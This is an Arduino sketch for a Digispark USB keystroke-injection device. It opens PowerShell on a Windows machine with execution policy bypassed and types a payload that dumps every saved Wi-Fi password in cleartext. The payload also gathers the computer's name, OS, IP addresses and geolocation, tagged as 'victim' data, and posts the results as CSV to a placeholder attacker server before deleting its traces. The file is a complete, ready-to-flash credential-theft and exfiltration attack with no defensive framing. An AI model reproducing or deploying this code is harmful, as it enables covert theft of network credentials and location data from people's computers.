#include "DigiKeyboard.h"

#define KEY_R 0x15

void setup() {
  pinMode(1, OUTPUT); // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000); // a bit shorter but safe on most PCs

  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Launch PowerShell (visible)
  DigiKeyboard.println("powershell -NoLogo -NoProfile -ExecutionPolicy Bypass");
  DigiKeyboard.delay(1800);

  // Wi-Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
  DigiKeyboard.print(
    F(
      "$u='http://YOUR_IP/wifi-recv.php';"
      "$t=$env:TEMP;"
      "netsh wlan export profile folder=\"$t\" key=clear > $null;"
      "$os=(Get-CimInstance Win32_OperatingSystem).Caption;"
      "$victimId=$env:COMPUTERNAME;"
      "try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org').Content}catch{$pub='(unknown)'};"
      "$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;"
      "if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null};"
      "if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'};"
      "try{$geo=Invoke-WebRequest -UseBasicParsing \"http://ip-api.com/json/$pub?fields=status,lat,lon\";$g=$geo.Content|ConvertFrom-Json;if($g.status -eq 'success'){$lat=[string]$g.lat;$lon=[string]$g.lon}else{$lat='N/A';$lon='N/A'}}catch{$lat='N/A';$lon='N/A'};"
      "$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');"
      "$items=@();"
      "Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
        "$x=[xml](Get-Content $_.FullName);"
        "$s=$x.WLANProfile.SSIDConfig.SSID.name;"
        "$p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial;"
        "$items+=[pscustomobject]@{"
          "Time=$ts;"
          "VictimID=$victimId;"
          "SSID=$s;"
          "Password=if($p){$p}else{''};"
          "VictimLANIP=$lan;"
          "VictimOS=$os;"
          "PublicIP=$pub;"
          "LANExtra='';"
          "Latitude=$lat;"
          "Longitude=$lon;"
          "PacketSummary=''"
        "};"
        "Remove-Item $_.FullName -ErrorAction SilentlyContinue"
      "};"
      "if(-not $items){"
        "$items=[pscustomobject]@{"
          "Time=$ts;"
          "VictimID=$victimId;"
          "SSID='(none)';"
          "Password='';"
          "VictimLANIP=$lan;"
          "VictimOS=$os;"
          "PublicIP=$pub;"
          "LANExtra='';"
          "Latitude=$lat;"
          "Longitude=$lon;"
          "PacketSummary=''"
        "}"
      "};"
      "$csv=\"$t\\w.csv\";"
      "$items|Export-Csv $csv -NoTypeInformation;"
      "Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);"
      "Remove-Item $csv -ErrorAction SilentlyContinue;"
      "exit"
    )
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000); // time to execute

  // Blink LED forever
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(150);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(150);
  }
}
